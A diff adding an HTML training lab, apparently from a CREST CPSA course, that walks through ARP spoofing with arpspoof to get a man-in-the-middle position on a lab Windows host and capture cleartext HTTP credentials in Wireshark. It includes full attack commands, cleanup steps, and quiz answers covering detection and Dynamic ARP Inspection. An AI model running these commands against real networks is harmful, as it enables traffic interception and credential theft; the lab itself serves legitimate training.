@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab D3-A: ARP Spoofing - Layer 2 MITM</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #21262d;
+    --border: #30363d;
+    --red: #c0392b;
+    --red-dim: #922b21;
+    --green: #2ecc71;
+    --yellow: #f1c40f;
+    --blue: #3498db;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --code-bg: #0d1117;
+    --tag-bg: #21262d;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.6; padding: 24px; max-width: 900px; margin: 0 auto; }
+  .lab-header { border-left: 4px solid var(--red); padding: 16px 20px; background: var(--surface); border-radius: 0 8px 8px 0; margin-bottom: 28px; }
+  .lab-badge { display: inline-block; background: var(--red); color: #fff; font-size: 11px; font-weight: 700; letter-spacing: 1px; padding: 3px 10px; border-radius: 4px; text-transform: uppercase; margin-bottom: 8px; }
+  .lab-header h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
+  .lab-header p { color: var(--muted); font-size: 13px; }
+  .meta-row { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 10px; }
+  .meta-item { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); }
+  .meta-item span.dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+  .dot-red { background: var(--red); }
+  .dot-yellow { background: var(--yellow); }
+  .dot-green { background: var(--green); }
+  .section { margin-bottom: 28px; }
+  .section-title { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 12px; padding-bottom: 6px; border-bottom: 1px solid var(--border); }
+  .obj-list { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+  .obj-list li { display: flex; align-items: flex-start; gap: 10px; font-size: 14px; }
+  .obj-list li::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: var(--red); margin-top: 8px; flex-shrink: 0; }
+  .env-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 12px; }
+  .env-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .env-card .label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 6px; }
+  .env-card .hostname { font-size: 15px; font-weight: 700; color: var(--text); margin-bottom: 4px; }
+  .env-card .ip { font-family: 'Courier New', monospace; font-size: 13px; color: var(--blue); }
+  .env-card .role { font-size: 12px; color: var(--muted); margin-top: 4px; }
+  .step-list { display: flex; flex-direction: column; gap: 20px; }
+  .step { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .step-header { display: flex; align-items: center; gap: 12px; padding: 14px 16px; border-bottom: 1px solid var(--border); background: var(--surface2); }
+  .step-num { background: var(--red); color: #fff; font-weight: 700; font-size: 13px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-title { font-weight: 600; font-size: 15px; }
+  .step-body { padding: 16px; }
+  .step-body p { font-size: 14px; color: var(--muted); margin-bottom: 12px; }
+  .step-body p:last-child { margin-bottom: 0; }
+  pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 6px; padding: 14px 16px; overflow-x: auto; margin: 10px 0; }
+  code { font-family: 'Courier New', monospace; font-size: 13px; color: #a9d1f7; }
+  pre code { color: #a9d1f7; }
+  .comment { color: var(--muted); }
+  .highlight { color: #f0b27a; }
+  .inline-code { background: var(--code-bg); border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px; font-family: 'Courier New', monospace; font-size: 12px; color: #a9d1f7; }
+  .callout { border-radius: 6px; padding: 12px 16px; margin: 12px 0; font-size: 13px; display: flex; gap: 10px; align-items: flex-start; }
+  .callout-info { background: #1a2332; border-left: 3px solid var(--blue); }
+  .callout-warn { background: #1f1d0e; border-left: 3px solid var(--yellow); }
+  .callout-success { background: #0f1e15; border-left: 3px solid var(--green); }
+  .callout-critical { background: #1a0a0a; border-left: 3px solid var(--red); }
+  .callout-icon { font-size: 15px; flex-shrink: 0; margin-top: 1px; }
+  .callout-body { color: var(--muted); }
+  .callout-body strong { color: var(--text); }
+  .answer-block { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; padding: 12px 16px; margin-top: 10px; }
+  .answer-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--green); font-weight: 700; margin-bottom: 6px; }
+  .answer-block p { font-size: 13px; color: var(--muted); margin: 0; }
+  .answer-block code { color: var(--green); }
+  .q-list { display: flex; flex-direction: column; gap: 14px; }
+  .q-item { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px 16px; }
+  .q-text { font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+  .q-num { color: var(--red); font-weight: 700; margin-right: 6px; }
+  details summary { cursor: pointer; font-size: 12px; color: var(--blue); user-select: none; margin-top: 6px; }
+  details summary:hover { color: #5dade2; }
+  details[open] summary { margin-bottom: 8px; }
+  .tag-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
+  .tag { background: var(--tag-bg); border: 1px solid var(--border); border-radius: 20px; padding: 3px 12px; font-size: 11px; color: var(--muted); }
+  .attack-flow { display: flex; flex-direction: column; gap: 0; margin: 12px 0; }
+  .flow-step { display: flex; align-items: flex-start; gap: 12px; padding: 12px 16px; background: var(--surface); border: 1px solid var(--border); }
+  .flow-step:first-child { border-radius: 8px 8px 0 0; }
+  .flow-step:last-child { border-radius: 0 0 8px 8px; }
+  .flow-step + .flow-step { border-top: none; }
+  .flow-num { background: var(--red-dim); color: #fff; font-weight: 700; font-size: 12px; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+  .flow-content .flow-title { font-weight: 600; font-size: 14px; margin-bottom: 3px; }
+  .flow-content .flow-desc { font-size: 13px; color: var(--muted); }
+  .flow-content .flow-arp { font-family: 'Courier New', monospace; font-size: 12px; color: var(--yellow); margin-top: 4px; }
+  .footer { margin-top: 40px; padding-top: 16px; border-top: 1px solid var(--border); font-size: 12px; color: var(--muted); text-align: center; }
+</style>
+</head>
+<body>
+
+<div class="lab-header">
+  <div class="lab-badge">CREST CPSA - Module D</div>
+  <h1>Lab D3-A: ARP Spoofing - Layer 2 MITM</h1>
+  <p>Position yourself between SYNTEX-WIN01 and the gateway using arpspoof, then capture intercepted credentials with Wireshark.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="dot dot-red"></span> Advanced</div>
+    <div class="meta-item"><span class="dot dot-red"></span> Offensive</div>
+    <div class="meta-item">~40 minutes</div>
+    <div class="meta-item">Target: SYNTEX-WIN01</div>
+  </div>
+  <div class="tag-row">
+    <span class="tag">ARP Spoofing</span>
+    <span class="tag">MITM</span>
+    <span class="tag">arpspoof</span>
+    <span class="tag">Layer 2</span>
+    <span class="tag">Wireshark</span>
+    <span class="tag">D3</span>
+  </div>
+</div>
+
+<div class="section">
+  <div class="section-title">Objectives</div>
+  <ul class="obj-list">
+    <li>Identify the gateway IP and the victim MAC/IP using arp and nmap</li>
+    <li>Enable IP forwarding on Kali so traffic passes through without dropping</li>
+    <li>Run dual arpspoof to poison both the victim and the gateway simultaneously</li>
+    <li>Capture credentials from traffic passing through the Kali machine</li>
+    <li>Verify MITM position using Wireshark ARP filter</li>
+    <li>Clean up the attack and restore ARP tables</li>
+  </ul>
+</div>
+
+<div class="section">
+  <div class="section-title">Lab Environment</div>
+  <div class="env-grid">
+    <div class="env-card">
+      <div class="label">Attacker</div>
+      <div class="hostname">Kali Linux</div>
+      <div class="ip">Your machine</div>
+      <div class="role">arpspoof, Wireshark, dsniff suite</div>
+    </div>
+    <div class="env-card">
+      <div class="label">Victim</div>
+      <div class="hostname">SYNTEX-WIN01</div>
+      <div class="ip">&lt;VICTIM-IP&gt;</div>
+      <div class="role">Windows - browsing HTTP to gateway</div>
+    </div>
+    <div class="env-card">
+      <div class="label">Gateway</div>
+      <div class="hostname">Lab Gateway</div>
+      <div class="ip">&lt;GATEWAY-IP&gt;</div>
+      <div class="role">Default gateway for the lab network</div>
+    </div>
+  </div>
+  <div class="callout callout-warn" style="margin-top:14px;">
+    <div class="callout-icon">&#9888;</div>
+    <div class="callout-body"><strong>Scope:</strong> ARP spoofing causes network disruption for other lab users on the same subnet. Only run this lab in your isolated SYNTEX lab environment, never on a shared network or production system. Always clean up when done.</div>
+  </div>
+</div>
+
+<div class="section">
+  <div class="section-title">How the Attack Works</div>
+  <div class="attack-flow">
+    <div class="flow-step">
+      <div class="flow-num">1</div>
+      <div class="flow-content">
+        <div class="flow-title">Poison the Victim</div>
+        <div class="flow-desc">Send continuous forged ARP replies to SYNTEX-WIN01, telling it that the gateway IP is at your MAC address.</div>
+        <div class="flow-arp">"Gateway (GATEWAY-IP) is at KALI-MAC"</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">2</div>
+      <div class="flow-content">
+        <div class="flow-title">Poison the Gateway</div>
+        <div class="flow-desc">Send continuous forged ARP replies to the gateway, telling it that the victim IP is at your MAC address.</div>
+        <div class="flow-arp">"Victim (VICTIM-IP) is at KALI-MAC"</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">3</div>
+      <div class="flow-content">
+        <div class="flow-title">MITM Achieved</div>
+        <div class="flow-desc">All traffic from SYNTEX-WIN01 to the internet now flows through Kali. IP forwarding passes it on so the victim does not notice the connection drop.</div>
+        <div class="flow-arp">SYNTEX-WIN01 &rarr; KALI &rarr; Gateway &rarr; Internet</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">4</div>
+      <div class="flow-content">
+        <div class="flow-title">Capture Credentials</div>
+        <div class="flow-desc">Wireshark or tcpdump on Kali sees all victim traffic. Any cleartext protocols (HTTP, FTP, Telnet) will contain readable credentials.</div>
+        <div class="flow-arp">Apply filter: http.request.method == "POST"</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <div class="section-title">Steps</div>
+  <div class="step-list">
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <div class="step-title">Identify victim and gateway</div>
+      </div>
+      <div class="step-body">
+        <p>Before running any attack you need three pieces of information: your own interface name, the victim IP, and the gateway IP.</p>
+        <pre><code><span class="comment"># Find your interface name and IP</span>
+ip a
+<span class="comment"># Note your interface (e.g. eth0) and your Kali IP address</span>
+
+<span class="comment"># Find the gateway IP</span>
+ip route | grep default
+<span class="comment"># Output: default via 192.168.X.X dev eth0 - the 192.168.X.X is your gateway</span>
+
+<span class="comment"># Confirm SYNTEX-WIN01 is alive and get its IP</span>
+nmap -sn &lt;NETWORK-RANGE&gt;/24
+<span class="comment"># Example: nmap -sn 192.168.1.0/24</span>
+<span class="comment"># Look for the Windows host in the results</span>
+
+<span class="comment"># Check your ARP cache to see the gateway MAC</span>
+arp -a</code></pre>
+        <div class="answer-block">
+          <div class="answer-label">Record These Values</div>
+          <p>You need:<br>
+          - Your interface: e.g. <code>eth0</code><br>
+          - Gateway IP: e.g. <code>192.168.1.1</code><br>
+          - Victim IP (SYNTEX-WIN01): <code>&lt;VICTIM-IP&gt;</code></p>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <div class="step-title">Enable IP forwarding</div>
+      </div>
+      <div class="step-body">
+        <p>This is critical. Without IP forwarding enabled, your Kali machine will drop all traffic it intercepts rather than passing it on. The victim will lose connectivity immediately and the attack will be obvious.</p>
+        <pre><code><span class="comment"># Enable IP forwarding for this session</span>
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+<span class="comment"># Verify it is enabled (should output 1)</span>
+cat /proc/sys/net/ipv4/ip_forward
+
+<span class="comment"># Alternative method:</span>
+sudo sysctl -w net.ipv4.ip_forward=1</code></pre>
+        <div class="callout callout-critical">
+          <div class="callout-icon">&#9888;</div>
+          <div class="callout-body"><strong>Do not skip this step.</strong> Running arpspoof without IP forwarding causes a network outage for the victim. In a real engagement this would immediately alert the client and may breach scope agreement.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <div class="step-title">Install dsniff if needed</div>
+      </div>
+      <div class="step-body">
+        <p>arpspoof is part of the dsniff package. Check if it is installed first.</p>
+        <pre><code><span class="comment"># Check if arpspoof is installed</span>
+which arpspoof
+
+<span class="comment"># If not found, install dsniff</span>
+sudo apt-get install dsniff -y</code></pre>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">4</div>
+        <div class="step-title">Run arpspoof - both directions simultaneously</div>
+      </div>
+      <div class="step-body">
+        <p>Open two terminal windows. You must run both arpspoof commands at the same time - poisoning only one direction gives you a half-duplex MITM that misses return traffic.</p>
+        <pre><code><span class="comment">### Terminal 1 - Poison the VICTIM (tell victim: gateway is at our MAC)</span>
+sudo arpspoof -i eth0 -t &lt;VICTIM-IP&gt; &lt;GATEWAY-IP&gt;
+
+<span class="comment">### Terminal 2 - Poison the GATEWAY (tell gateway: victim is at our MAC)</span>
+sudo arpspoof -i eth0 -t &lt;GATEWAY-IP&gt; &lt;VICTIM-IP&gt;</code></pre>
+        <div class="callout callout-info">
+          <div class="callout-icon">&#9432;</div>
+          <div class="callout-body">arpspoof will print a line for each ARP packet sent - it runs continuously until you press <strong>Ctrl+C</strong>. Leave both terminals running while you do step 5.</div>
+        </div>
+        <div class="answer-block">
+          <div class="answer-label">What arpspoof Is Doing</div>
+          <p>Each line in the output is one forged ARP reply. The victim's ARP cache is being continuously overwritten with your MAC address mapped to the gateway IP. ARP caches expire, so arpspoof must keep refreshing the poison.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">5</div>
+        <div class="step-title">Verify MITM position with Wireshark</div>
+      </div>
+      <div class="step-body">
+        <p>Open Wireshark in a third terminal. You should be seeing traffic from SYNTEX-WIN01 passing through your machine.</p>
+        <pre><code><span class="comment"># Open Wireshark</span>
+wireshark &amp;
+
+<span class="comment"># Apply the ARP display filter to see poison packets being sent</span>
+arp
+
+<span class="comment"># To see victim's traffic passing through:</span>
+ip.addr == &lt;VICTIM-IP&gt;
+
+<span class="comment"># To capture HTTP credentials from the victim:</span>
+http.request.method == "POST"</code></pre>
+        <div class="callout callout-success">
+          <div class="callout-icon">&#10003;</div>
+          <div class="callout-body">When MITM is working, you will see packets from <strong>&lt;VICTIM-IP&gt;</strong> appearing in Wireshark even though Kali is not the source or destination. This traffic is passing through your machine because of the poisoned ARP cache.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">6</div>
+        <div class="step-title">Verify victim ARP cache is poisoned</div>
+      </div>
+      <div class="step-body">
+        <p>On SYNTEX-WIN01, check the ARP table. The gateway entry should show your Kali MAC address - confirming the poison worked.</p>
+        <pre><code><span class="comment"># On SYNTEX-WIN01 (Windows command prompt):</span>
+arp -a
+
+<span class="comment"># Look for the gateway IP entry</span>
+<span class="comment"># Example output (gateway poisoned):</span>
+<span class="comment"># 192.168.1.1    00-0c-29-aa-bb-cc    dynamic  &lt;-- This is YOUR Kali MAC</span>
+
+<span class="comment"># To find your Kali MAC address:</span>
+<span class="comment"># On Kali:</span>
+ip link show eth0 | grep ether</code></pre>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">7</div>
+        <div class="step-title">Clean up and restore ARP tables</div>
+      </div>
+      <div class="step-body">
+        <p>Stop the attack cleanly. Simply pressing Ctrl+C in both arpspoof terminals is usually enough - arpspoof sends a few correct ARP replies before exiting to restore the tables.</p>
+        <pre><code><span class="comment"># Press Ctrl+C in both arpspoof terminal windows</span>
+<span class="comment"># arpspoof will automatically send corrective ARP replies on exit</span>
+
+<span class="comment"># Disable IP forwarding (restore to default)</span>
+echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+<span class="comment"># Verify ARP tables have restored on SYNTEX-WIN01:</span>
+<span class="comment"># On SYNTEX-WIN01 - Windows command prompt:</span>
+arp -d *
+<span class="comment"># This clears the ARP cache so it repopulates with correct values</span>
+
+<span class="comment"># On Kali - verify your own ARP cache is clean:</span>
+arp -a</code></pre>
+        <div class="callout callout-warn">
+          <div class="callout-icon">&#9888;</div>
+          <div class="callout-body"><strong>Always clean up.</strong> In a real penetration test, failing to restore ARP tables after an MITM attack leaves the network in a broken state and may constitute damage to the client's environment - a potential legal issue regardless of scope.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="section">
+  <div class="section-title">Confirmation Questions</div>
+  <div class="q-list">
+    <div class="q-item">
+      <div class="q-text"><span class="q-num">1.</span> Why must IP forwarding be enabled before running arpspoof?</div>
+      <details><summary>Show answer</summary>
+        <div class="answer-block"><p>Without IP forwarding, the Linux kernel drops packets that are not destined for the local machine. This means all victim traffic routed to Kali gets silently discarded, causing a complete loss of connectivity for the victim. Enabling IP forwarding tells the kernel to forward packets between interfaces rather than drop them, making the attack invisible to the victim.</p></div>
+      </details>
+    </div>
+    <div class="q-item">
+      <div class="q-text"><span class="q-num">2.</span> Why do you need to run arpspoof in both directions rather than just poisoning the victim?</div>
+      <details><summary>Show answer</summary>
+        <div class="answer-block"><p>If you only poison the victim, traffic from victim to gateway flows through Kali, but return traffic from the gateway goes directly back to the victim (bypassing Kali). You only see half the conversation. To intercept both directions you must also poison the gateway, telling it that the victim's IP is at your MAC address.</p></div>
+      </details>
+    </div>
+    <div class="q-item">
+      <div class="q-text"><span class="q-num">3.</span> How would you verify from the victim machine that an ARP poisoning attack is in progress?</div>
+      <details><summary>Show answer</summary>
+        <div class="answer-block"><p>Run <code>arp -a</code> on the victim machine and check the gateway's MAC address. If it matches the MAC address of a machine that should not be the gateway, ARP poisoning is occurring. The attack is also detectable by tools like XArp or network IDS that monitor for ARP anomalies (such as the same MAC claiming multiple IPs, or rapid ARP reply floods).</p></div>
+      </details>
+    </div>
+    <div class="q-item">
+      <div class="q-text"><span class="q-num">4.</span> What switch-level defence prevents ARP spoofing attacks, and how does it work?</div>
+      <details><summary>Show answer</summary>
+        <div class="answer-block"><p><strong>Dynamic ARP Inspection (DAI)</strong> - a feature on managed switches. DAI validates ARP packets against the DHCP snooping binding table, which maps IP addresses to MAC addresses and the switch port they should come from. Any ARP reply that does not match the binding table is dropped. This makes ARP spoofing ineffective because the forged replies are silently discarded before they reach the victim.</p></div>
+      </details>
+    </div>
+    <div class="q-item">
+      <div class="q-text"><span class="q-num">5.</span> You have achieved MITM between the victim and the gateway. What Wireshark display filter would you use to look for cleartext HTTP login credentials in the intercepted traffic?</div>
+      <details><summary>Show answer</summary>
+        <div class="answer-block"><p><code>http.request.method == "POST"</code> - this shows only HTTP POST requests, which are used for form submissions including login forms. The credentials will be visible in the <strong>HTML Form URL Encoded</strong> section of the packet details pane. Combine with <code>ip.addr == &lt;VICTIM-IP&gt;</code> to isolate only the victim's traffic: <code>http.request.method == "POST" and ip.addr == &lt;VICTIM-IP&gt;</code></p></div>
+      </details>
+    </div>
+  </div>
+</div>
+
+<div class="footer">CREST CPSA | My Cyber Academy | Module D - Networking Equipment | Lab D3-A</div>
+
+</body>
+</html>
